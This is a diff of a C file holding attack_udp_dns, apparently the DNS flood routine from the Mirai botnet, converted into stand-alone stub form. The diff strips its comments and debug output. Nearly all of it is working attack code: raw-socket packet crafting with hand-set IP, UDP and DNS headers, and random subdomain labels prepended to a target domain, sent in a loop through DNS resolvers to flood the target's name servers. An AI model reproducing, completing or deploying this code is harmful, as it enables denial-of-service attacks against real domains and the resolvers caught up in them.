@@ -1,71 +1,71 @@
-#define NULL ((void*)0)
-typedef unsigned long size_t;  // Customize by platform.
+
+typedef unsigned long size_t;
 typedef long intptr_t; typedef unsigned long uintptr_t;
-typedef long scalar_t__;  // Either arithmetic or pointer type.
-/* By default, we understand bool (as a convenience). */
+typedef long scalar_t__;
+
 typedef int bool;
-#define false 0
-#define true 1
 
-/* Forward declarations */
-typedef  struct TYPE_4__   TYPE_2__ ;
-typedef  struct TYPE_3__   TYPE_1__ ;
 
-/* Type definitions */
-typedef  int uint8_t ;
-typedef  int uint16_t ;
+
+
+typedef struct TYPE_4__ TYPE_2__ ;
+typedef struct TYPE_3__ TYPE_1__ ;
+
+
+typedef int uint8_t ;
+typedef int uint16_t ;
 struct udphdr {int source; int dest; void* len; scalar_t__ check; } ;
 struct sockaddr_in {int dummy; } ;
 struct sockaddr {int dummy; } ;
-struct iphdr {int version; int ihl; int tos; int id; int ttl; scalar_t__ check; void* daddr; int /*<<< orphan*/  saddr; int /*<<< orphan*/  protocol; void* frag_off; void* tot_len; } ;
+struct iphdr {int version; int ihl; int tos; int id; int ttl; scalar_t__ check; void* daddr; int saddr; int protocol; void* frag_off; void* tot_len; } ;
 struct dnshdr {int id; void* qdcount; void* opts; } ;
 struct dns_question {void* qclass; void* qtype; } ;
 struct TYPE_3__ {void* s_addr; } ;
 struct TYPE_4__ {int sin_port; TYPE_1__ sin_addr; } ;
 struct attack_target {TYPE_2__ sock_addr; } ;
 struct attack_option {int dummy; } ;
-typedef  int port_t ;
-typedef  void* ipv4_t ;
-typedef  void* BOOL ;
+typedef int port_t ;
+typedef void* ipv4_t ;
+typedef void* BOOL ;
 
-/* Variables and functions */
- int /*<<< orphan*/  AF_INET ; 
- int /*<<< orphan*/  ATK_OPT_DNS_HDR_ID ; 
- int /*<<< orphan*/  ATK_OPT_DOMAIN ; 
- int /*<<< orphan*/  ATK_OPT_DPORT ; 
- int /*<<< orphan*/  ATK_OPT_IP_DF ; 
- int /*<<< orphan*/  ATK_OPT_IP_IDENT ; 
- int /*<<< orphan*/  ATK_OPT_IP_TOS ; 
- int /*<<< orphan*/  ATK_OPT_IP_TTL ; 
- int /*<<< orphan*/  ATK_OPT_PAYLOAD_SIZE ; 
- int /*<<< orphan*/  ATK_OPT_SPORT ; 
- int FALSE ; 
- int /*<<< orphan*/  IPPROTO_IP ; 
- int /*<<< orphan*/  IPPROTO_UDP ; 
- int /*<<< orphan*/  IP_HDRINCL ; 
- int /*<<< orphan*/  LOCAL_ADDR ; 
- int /*<<< orphan*/  MSG_NOSIGNAL ; 
- int PROTO_DNS_QCLASS_IP ; 
- int PROTO_DNS_QTYPE_A ; 
- int /*<<< orphan*/  SOCK_RAW ; 
- scalar_t__ TRUE ; 
- void* attack_get_opt_int (int,struct attack_option*,int /*<<< orphan*/ ,int) ; 
- char* attack_get_opt_str (int,struct attack_option*,int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
- void* calloc (int,int) ; 
- scalar_t__ checksum_generic (int*,int) ; 
- scalar_t__ checksum_tcpudp (struct iphdr*,struct udphdr*,void*,int) ; 
- int /*<<< orphan*/  close (int) ; 
- scalar_t__ errno ; 
- void* get_dns_resolver () ; 
- void* htons (int) ; 
- int /*<<< orphan*/  printf (char*,...) ; 
- int /*<<< orphan*/  rand_alphastr (int*,int) ; 
- int rand_next () ; 
- int /*<<< orphan*/  sendto (int,char*,int,int /*<<< orphan*/ ,struct sockaddr*,int) ; 
- int setsockopt (int,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int*,int) ; 
- int socket (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
- int /*<<< orphan*/  util_memcpy (char*,char*,int) ; 
- int util_strlen (char*) ; 
+
+ int AF_INET ;
+ int ATK_OPT_DNS_HDR_ID ;
+ int ATK_OPT_DOMAIN ;
+ int ATK_OPT_DPORT ;
+ int ATK_OPT_IP_DF ;
+ int ATK_OPT_IP_IDENT ;
+ int ATK_OPT_IP_TOS ;
+ int ATK_OPT_IP_TTL ;
+ int ATK_OPT_PAYLOAD_SIZE ;
+ int ATK_OPT_SPORT ;
+ int FALSE ;
+ int IPPROTO_IP ;
+ int IPPROTO_UDP ;
+ int IP_HDRINCL ;
+ int LOCAL_ADDR ;
+ int MSG_NOSIGNAL ;
+ int PROTO_DNS_QCLASS_IP ;
+ int PROTO_DNS_QTYPE_A ;
+ int SOCK_RAW ;
+ scalar_t__ TRUE ;
+ void* attack_get_opt_int (int,struct attack_option*,int ,int) ;
+ char* attack_get_opt_str (int,struct attack_option*,int ,int *) ;
+ void* calloc (int,int) ;
+ scalar_t__ checksum_generic (int*,int) ;
+ scalar_t__ checksum_tcpudp (struct iphdr*,struct udphdr*,void*,int) ;
+ int close (int) ;
+ scalar_t__ errno ;
+ void* get_dns_resolver () ;
+ void* htons (int) ;
+ int printf (char*,...) ;
+ int rand_alphastr (int*,int) ;
+ int rand_next () ;
+ int sendto (int,char*,int,int ,struct sockaddr*,int) ;
+ int setsockopt (int,int ,int ,int*,int) ;
+ int socket (int ,int ,int ) ;
+ int util_memcpy (char*,char*,int) ;
+ int util_strlen (char*) ;
 
 void attack_udp_dns(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
@@ -79,32 +79,32 @@ void attack_udp_dns(uint8_t targs_len, struct attack_target *targs, uint8_t opts
     port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 53);
     uint16_t dns_hdr_id = attack_get_opt_int(opts_len, opts, ATK_OPT_DNS_HDR_ID, 0xffff);
     uint8_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 12);
-    char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
+    char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, ((void*)0));
     int domain_len;
     ipv4_t dns_resolver = get_dns_resolver();
 
-    if (domain == NULL)
+    if (domain == ((void*)0))
     {
-#ifdef DEBUG
-        printf("Cannot send DNS flood without a domain\n");
-#endif
+
+
+
         return;
     }
     domain_len = util_strlen(domain);
 
     if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
     {
-#ifdef DEBUG
-        printf("Failed to create raw socket. Aborting attack\n");
-#endif
+
+
+
         return;
     }
     i = 1;
     if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
     {
-#ifdef DEBUG
-        printf("Failed to set IP_HDRINCL. Aborting\n");
-#endif
+
+
+
         close(fd);
         return;
     }
@@ -142,17 +142,17 @@ void attack_udp_dns(uint8_t targs_len, struct attack_target *targs, uint8_t opts
         udph->len = htons(sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question));
 
         dnsh->id = htons(dns_hdr_id);
-        dnsh->opts = htons(1 << 8); // Recursion desired
+        dnsh->opts = htons(1 << 8);
         dnsh->qdcount = htons(1);
 
-        // Fill out random area
+
         *qname++ = data_len;
         qname += data_len;
 
         curr_lbl = qname;
-        util_memcpy(qname + 1, domain, domain_len + 1); // Null byte at end needed
+        util_memcpy(qname + 1, domain, domain_len + 1);
 
-        // Write in domain
+
         for (ii = 0; ii < domain_len; ii++)
         {
             if (domain[ii] == '.')
@@ -204,10 +204,10 @@ void attack_udp_dns(uint8_t targs_len, struct attack_target *targs, uint8_t opts
             targs[i].sock_addr.sin_port = udph->dest;
             sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
         }
-#ifdef DEBUG
-            break;
-            if (errno != 0)
-                printf("errno = %d\n", errno);
-#endif
+
+
+
+
+
     }
 }
